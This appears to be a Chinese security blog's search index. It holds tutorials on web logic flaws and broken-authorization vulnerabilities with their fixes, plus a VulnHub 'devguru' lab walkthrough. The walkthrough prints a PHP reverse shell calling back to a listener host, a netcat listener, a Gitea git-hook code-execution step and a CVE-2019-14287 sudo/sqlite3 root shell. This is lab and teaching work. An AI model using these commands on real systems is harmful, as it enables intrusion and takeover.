<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逻辑漏洞产生原理及利用</title>
      <link href="/2025/05/04/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/05/04/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="1-验证码漏洞"><a href="#1-验证码漏洞" class="headerlink" title="1 验证码漏洞"></a>1 验证码漏洞</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><strong>验证码未失效</strong>：同一验证码可多次使用，或未设置超时限制。</li><li><strong>验证码与用户未绑定</strong>：未与手机号&#x2F;邮箱关联，导致可被劫持或篡改。</li><li><strong>验证码回显</strong>：验证码明文返回至前端或数据包中。</li><li><strong>分步校验</strong>：验证码校验与后续操作未绑定，导致绕过。</li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>爆破&#x2F;重放</strong>：通过Burp Suite等工具对验证码进行爆破或重放请求 。</p></li><li><p><strong>劫持验证码</strong>：修改数据包中的手机号&#x2F;邮箱参数，将验证码发送至攻击者设备 。</p></li></ul><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><strong>绑定用户信息</strong>：验证码需与用户身份（如Session ID）绑定。</li><li><strong>时效性限制</strong>：设置单次有效且超时失效（如5分钟）。</li><li><strong>加密传输</strong>：验证码凭证需加密且不返回前端</li></ul><h2 id="2-密码找回漏洞"><a href="#2-密码找回漏洞" class="headerlink" title="2 密码找回漏洞"></a>2 密码找回漏洞</h2><h3 id="产生原理-1"><a href="#产生原理-1" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>验证步骤缺失</strong>：未校验用户身份与验证码的绑定关系。</p></li><li><p><strong>凭证泄露</strong>：重置密码的Token或链接可被预测或截获。</p></li><li><p><strong>分步逻辑缺陷</strong>：跳过验证步骤直接进入密码修改页面 。</p></li></ol><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>篡改参数</strong>：修改数据包中的手机号或邮箱，劫持他人验证码。</p></li><li><p><strong>Token爆破</strong>：利用弱随机性生成的Token进行枚举 。</p></li></ul><h3 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><strong>多因素校验</strong>：结合短信验证码、邮箱验证和用户身份信息。</li><li><strong>随机Token</strong>：使用强随机算法生成一次性Token，并绑定用户IP</li></ul><h2 id="3-支付逻辑漏洞"><a href="#3-支付逻辑漏洞" class="headerlink" title="3 支付逻辑漏洞"></a>3 支付逻辑漏洞</h2><h3 id="产生原理-2"><a href="#产生原理-2" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>金额篡改</strong>：前端提交金额未与服务端校验，允许负数或超额。</p></li><li><p><strong>竞争条件</strong>：并发请求绕过库存或余额校验（如多次支付仅扣款一次）。</p></li><li><p><strong>订单替换</strong>：修改订单ID或商品参数，低价购买高价商品 。</p></li></ol><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>篡改金额参数</strong>：修改数据包中的<code>amount</code>、<code>price</code>等字段。</p></li><li><p><strong>并发请求攻击</strong>：利用Burp Suite多线程发送支付请求 。</p></li></ul><h3 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>服务端校验</strong>：重新计算订单金额，禁止依赖前端提交的数据。</p></li><li><p><strong>事务锁机制</strong>：使用数据库事务锁或分布式锁防止竞争条件 .</p></li></ul><h2 id="4、业务数据篡改"><a href="#4、业务数据篡改" class="headerlink" title="4、业务数据篡改"></a>4、业务数据篡改</h2><h3 id="产生原理-3"><a href="#产生原理-3" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>参数可预测</strong>：商品ID、订单号等参数规律性强，可遍历或猜测。</p></li><li><p><strong>客户端信任过度</strong>：依赖前端校验，未在服务端验证数据合法性 。</p></li></ol><h4 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h4><ul><li><p><strong>遍历参数</strong>：修改商品ID或订单号，获取未授权数据。</p></li><li><p><strong>负数攻击</strong>：提交负数库存或金额，导致逻辑错误（如余额增加）。</p></li></ul><h4 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h4><ul><li><p><strong>数据签名</strong>：对关键参数附加哈希签名，防止篡改。</p></li><li><p><strong>服务端验证</strong>：校验参数合法性（如数值范围、格式） 。</p></li></ul><h2 id="5、会话固定与会话劫持"><a href="#5、会话固定与会话劫持" class="headerlink" title="5、会话固定与会话劫持"></a>5、会话固定与会话劫持</h2><h3 id="产生原理-4"><a href="#产生原理-4" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>Session固定</strong>：登录前后Session ID不变，攻击者可预置Session诱导用户登录。</p></li><li><p><strong>Cookie未加密</strong>：Cookie中存储明文身份信息，可被篡改 。</p></li></ol><h3 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>诱导登录</strong>：发送带有固定Session ID的链接给用户。</p></li><li><p><strong>Cookie伪造</strong>：修改Cookie中的<code>user_id</code>或<code>role</code>字段 。</p></li></ul><h3 id="修复方法-4"><a href="#修复方法-4" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>登录后更新Session</strong>：用户认证成功后生成新Session ID。</p></li><li><p><strong>HttpOnly &amp; Secure标记</strong>：防止XSS窃取Cookie，强制HTTPS传输 。</p></li></ul><h2 id="6、短信-邮件轰炸"><a href="#6、短信-邮件轰炸" class="headerlink" title="6、短信&#x2F;邮件轰炸"></a>6、短信&#x2F;邮件轰炸</h2><h3 id="产生原理-5"><a href="#产生原理-5" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>无频率限制</strong>：未限制同一手机号&#x2F;邮箱的发送次数。</p></li><li><p><strong>接口暴露</strong>：短信发送接口未鉴权，可被恶意调用 。</p></li></ol><h3 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>重放攻击</strong>：多次发送同一请求导致目标设备接收大量短信。</p></li><li><p><strong>参数遍历</strong>：修改手机号末位或添加特殊符号绕过限制（如<code>1380013800+1</code>） 。</p></li></ul><h4 id="修复方法-5"><a href="#修复方法-5" class="headerlink" title="修复方法"></a>修复方法</h4><ul><li><p><strong>频率控制</strong>：限制同一用户&#x2F;IP的发送频率（如每分钟1次）。</p></li><li><p><strong>图形验证码</strong>：高风险操作前需通过人机验证 。</p></li></ul><h2 id="7、条件竞争漏洞（Race-Condition）"><a href="#7、条件竞争漏洞（Race-Condition）" class="headerlink" title="7、条件竞争漏洞（Race Condition）"></a>7、条件竞争漏洞（Race Condition）</h2><h3 id="产生原理-6"><a href="#产生原理-6" class="headerlink" title="产生原理"></a>产生原理</h3><p>多线程并发操作未加锁，导致数据不一致（如余额检查与扣款分离）。</p><h3 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><strong>并发请求</strong>：同时发起多次支付或提现请求，绕过余额校验。</li></ul><h3 id="修复方法-6"><a href="#修复方法-6" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>数据库锁机制</strong>：使用悲观锁或乐观锁控制并发。</p></li><li><p><strong>原子操作</strong>：将余额检查与扣款合并为事务操作 .</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战： jarbas</title>
      <link href="/2025/05/04/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9A%20jarbas/"/>
      <url>/2025/05/04/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9A%20jarbas/</url>
      
        <content type="html"><![CDATA[<p>靶机地址</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2>]]></content>
      
      
      <categories>
          
          <category> /漏洞原理/2025-05 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>越权漏洞原理及利用</title>
      <link href="/2025/05/04/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/05/04/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>越权漏洞是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。<strong>简单来说，就是攻击者可以做一些本来不该他们做的事情（增删改查）</strong>。</p><h2 id="1-形成原理"><a href="#1-形成原理" class="headerlink" title="1.形成原理"></a>1.形成原理</h2><ol><li><p>​<strong>​权限验证缺失​</strong>​</p><ul><li><p>系统未对用户操作进行严格的身份与权限校验，仅依赖前端参数（如URL中的用户ID、订单ID）判断权限</p><p>。例如，查询订单时直接使用用户提交的<code>orderid</code>而未验证其归属权，导致攻击者可遍历ID获取他人数据。</p></li><li><p>服务端未在关键操作（如增删改查）前二次验证用户身份，例如修改密码时仅验证第一步的短信验证码，未在第二步确认用户身份。</p></li></ul></li><li><p>​<strong>​参数可控性漏洞​</strong>​</p><ul><li>用户可控参数（如Cookie、GET&#x2F;POST参数）被直接用于权限判断。例如，Apache Superset的默认<code>secret_key</code>泄露后，攻击者伪造Cookie绕过身份验证。</li></ul></li><li><p>​<strong>​会话管理缺陷​</strong>​</p><ul><li>Session未正确绑定用户身份与权限层级，或Cookie中存储明文权限标识（如<code>isadmin=1</code>），攻击者可篡改权限标识实现垂直越权。</li></ul></li><li><p>​<strong>​业务逻辑设计缺陷​</strong>​</p><ul><li><p>多阶段业务流程未全程校验权限。例如文件下载功能仅在前端隐藏URL，未在服务端验证用户是否付费。</p></li><li><p>目录遍历漏洞（如通过<code>../</code>访问管理员接口）或未授权访问（如直接输入管理页面URL）。</p></li></ul></li></ol><h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>发生在具有相同权限级别的用户之间。攻击者通过利用这些漏洞，访问其他用户拥有的资源或执行与其权限级别不符的操作。、</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>发生在具有多个权限级别的系统中。攻击者通过利用这些漏洞，从一个低权限级别跳转到一个更高的权限级别。例如，攻击者从普通用户身份成功跃迁为管理员。</p><h2 id="3-修复"><a href="#3-修复" class="headerlink" title="3.修复"></a>3.修复</h2><p>越权漏洞的形成原理与修复方法可总结如下：</p><h3 id="一、形成原理"><a href="#一、形成原理" class="headerlink" title="一、形成原理"></a>一、形成原理</h3><ol><li><p>​<strong>​权限验证缺失​</strong>​</p><ul><li><p>系统未对用户操作进行严格的身份与权限校验，仅依赖前端参数（如URL中的用户ID、订单ID）判断权限</p><p>2</p><p>3</p><p>4</p><p>。例如，查询订单时直接使用用户提交的<code>orderid</code>而未验证其归属权，导致攻击者可遍历ID获取他人数据</p><p>2</p><p>6</p><p>。</p></li><li><p>服务端未在关键操作（如增删改查）前二次验证用户身份，例如修改密码时仅验证第一步的短信验证码，未在第二步确认用户身份</p><p>6</p><p>9</p><p>。</p></li></ul></li><li><p>​<strong>​参数可控性漏洞​</strong>​</p><ul><li><p>用户可控参数（如Cookie、GET&#x2F;POST参数）被直接用于权限判断。例如，Apache Superset的默认<code>secret_key</code>泄露后，攻击者伪造Cookie绕过身份验证</p><p>1</p><p>3</p><p>。</p></li></ul></li><li><p>​<strong>​会话管理缺陷​</strong>​</p><ul><li><p>Session未正确绑定用户身份与权限层级，或Cookie中存储明文权限标识（如<code>isadmin=1</code>），攻击者可篡改权限标识实现垂直越权</p><p>6</p><p>8</p><p>。</p></li></ul></li><li><p>​<strong>​业务逻辑设计缺陷​</strong>​</p><ul><li><p>多阶段业务流程未全程校验权限。例如文件下载功能仅在前端隐藏URL，未在服务端验证用户是否付费</p><p>4</p><p>6</p><p>9</p><p>。</p></li><li><p>目录遍历漏洞（如通过<code>../</code>访问管理员接口）或未授权访问（如直接输入管理页面URL）</p><p>3</p><p>6</p><p>9</p><p>。</p></li></ul></li></ol><h3 id="二、修复方法"><a href="#二、修复方法" class="headerlink" title="二、修复方法"></a>二、修复方法</h3><ol><li><p>​<strong>​权限校验强化​</strong>​</p><ul><li><p>​<strong>​服务端验证​</strong>​：所有权限判断应在服务端完成，避免依赖前端参数。例如，通过Session获取当前用户ID，而非从请求参数中提取。</p></li><li><p>​<strong>​最小权限原则​</strong>​：用户仅分配完成操作所需的最小权限，避免权限泛化。</p></li></ul></li><li><p>​<strong>​参数安全处理​</strong>​</p><ul><li><p>​<strong>​加密敏感参数​</strong>​：对资源ID（如订单号、文件ID）进行加密或哈希处理，防止遍历攻击。</p></li><li><p>​<strong>​输入合法性校验​</strong>​：对用户输入的参数进行格式、范围校验，例如限制ID为数字且属于当前用户。</p></li></ul></li><li><p>​<strong>​会话与身份管理​</strong>​</p><ul><li><p>​<strong>​绑定Session与权限​</strong>​：登录后，将用户角色、权限信息存储在服务端Session中，关键操作时校验权限层级。</p></li><li><p>​<strong>​敏感操作二次验证​</strong>​：如修改密码、支付等操作需重新输入密码或验证码。</p></li></ul></li><li><p>​<strong>​业务逻辑加固​</strong>​</p><ul><li><p>​<strong>​接口鉴权​</strong>​：为每个功能接口定义权限码，通过AOP切面统一校验用户权限。例如，使用注解<code>@FunctionAuth</code>标记接口所需权限。</p></li><li><p>​<strong>​访问控制策略​</strong>​：限制未授权路径访问。例如，管理员接口需校验用户角色，并避免通过URL路径跳转绕过（如<code>/admin/../user</code>）。</p></li></ul></li><li><p>​<strong>​安全框架与工具​</strong>​</p><ul><li><p>​<strong>​使用成熟权限框架​</strong>​：如Spring Security、Shiro，实现角色-资源-操作的动态权限管理。</p></li><li><p>​<strong>​日志与监控​</strong>​：记录敏感操作日志，实时检测异常请求（如频繁遍历ID）。</p></li><li></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
            <tag> ctf-web </tag>
            
            <tag> 越权漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战：devguru</title>
      <link href="/2025/05/03/devguru-1/"/>
      <url>/2025/05/03/devguru-1/</url>
      
        <content type="html"><![CDATA[<p>靶机地址<a href="https://www.vulnhub.com/entry/devguru-1,620/">devguru</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规扫描</p><p><code>sudo nmap 192.168.1.0/24 -sn</code>靶机发现192.168.1.138</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png"></p><p><code>sudo nmap $ip -p- --min-rate=10000</code>端口扫描22,80,8585</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png"></p><p><code>sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru/detail</code>细节扫描，tcp协议扫描对应端口，-sC使用默认脚本，-SV扫描版本信息，-O确定操作系统，-oA格式化输出</p><p> <img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png"></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png"></p><p>80端口存在git泄露，8585端口运行了gitea</p><p><code>sudo nmap -sU --top-ports 20 $ip -oA devguru/udp</code>扫描udp的常见端口，有时可以多指定一些端口</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png" alt="enter description here"></p><p>目录扫描，有时一个工具没有收获可以多试试几个工具（如dirb，dirsearch，gobuster等）</p><p>80端口目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png"></p><p>8585端口的目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png" alt="enter description here"></p><h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>80端口存在git泄露，使用githack工具下载下来</p><p><code>sudo python GitHack.py http://192.168.1.138</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png"></p><p>重点查看配置相关文件</p><p>config下的database.php发现数据库信息</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png"></p><p>访问80端口的adminer.php发现是数据库管理</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png"></p><p>使用刚刚获取的信息登录</p><p>优先关注users等信息，只找到一个backend_users的表，此时有两个思路，1修改原来管理员的密码，危险程度较高，容易被发现，2是新建一个用户，危险程度较低，这里选择新建用户<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png" alt="enter description here"></p><p>最后is_superuser要设置为1，在用户组将我们新建的用户归类到管理员组</p><p>同时根据数据库加上80端口扫描的目录backend,访问并登录</p><p>登录之后在cms -add - code输入反弹shell的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStart()&#123;</span><br><span class="line">//nc监听7777端口</span><br><span class="line">    $s   =fsockopen(&quot;192.168.1.114&quot;,5555);</span><br><span class="line">    $proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png"></p><p>同时开启本地监听<code>nc -lvvp 5555</code></p><p>访问&#x2F;home1（新建网页名称）执行代码获取shell</p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="获取高交互shell"><a href="#获取高交互shell" class="headerlink" title="获取高交互shell"></a>获取高交互shell</h3><p>使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获得交互更好的shell（使用什么版本的python主要看环境有什么版本）</p><p>读取&#x2F;etc&#x2F;passwd文件发现只有root和frank用户有&#x2F;bin&#x2F;bash即允许ssh且有高交互shell</p><p>尝试读取shadow文件权限不允许，通常shadow文件都是只有root用户有权限的，但是也不一定，如果可以读取就可以利用该文件进行hash碰撞</p><p>使用python启动一个快速http服务共享文件<code>python -m http.server</code></p><p>使用wget下载linpeas.sh和LinEnum.sh</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png"></p><p>提升权限并运行脚本</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png"></p><p>suid不存在提权，看看sudo，需要密码，无法获得</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png"></p><p>查看备份文件<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png"></p><h3 id="获取普通用户"><a href="#获取普通用户" class="headerlink" title="获取普通用户"></a>获取普通用户</h3><p>发现新的服务器连接<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png" alt="enter description here"></p><p>同样查看user，因为我们已经获取了web的权限，因此这里我们想要获取frank用户的权限，所以这里的选择是更改frank的密码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png" alt="enter description here"></p><p>原来的gitea的加密方式是pbkdf2且有salt，我们选择换一个加密方式，bcrypt，使用网站实现（我这里尝试了几种方式，只有bcrypt可行，有的博客使用了原加密方式，但没说清楚salt值的获取）<a href="https://www.bejson.com/encrypt/bcrpyt_encode/#google_vignette">在线Bcrypt密码生成工具-Bejson.com</a></p><p><code>$2a$10$sV1DF9po/5T1BE2dsy2OueGZ/VuPrUrwDR6aA88Ygu2gv6GPeGtzO</code></p><p>结合目录扫描的结构gitea在8585端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png" alt="enter description here"></p><p>左下角显示gitea的版本是1.12.5</p><p>该版本存在以下漏洞</p><p>setting -&gt; git hook输入命令</p><p>然后编辑 readme.md 随便编辑即可执行<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png"></p><p>成功拿到<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png"></p><p>存在sqlite3无需密码使用<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png"></p><h2 id="sqlite3配合sudo漏洞提权"><a href="#sqlite3配合sudo漏洞提权" class="headerlink" title="sqlite3配合sudo漏洞提权"></a>sqlite3配合sudo漏洞提权</h2><p>发现特权命令&#x2F;usr&#x2F;bin&#x2F;sqlite3使用网站查找<a href="https://gtfobins.github.io/">GTFOBins</a></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png"></p><p>复制，执行，发现</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png"></p><p>sudo的版本是1.8.21，存在一个<a href="https://www.freebuf.com/vuls/217089.html">CVE-2019-14287：sudo权限绕过漏洞分析与复现 - FreeBuf网络安全行业门户</a>的漏洞</p><p>这里可以使用该漏洞配合sqlite3提权</p><p><code>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> web渗透 </tag>
            
            <tag> vulnhub靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
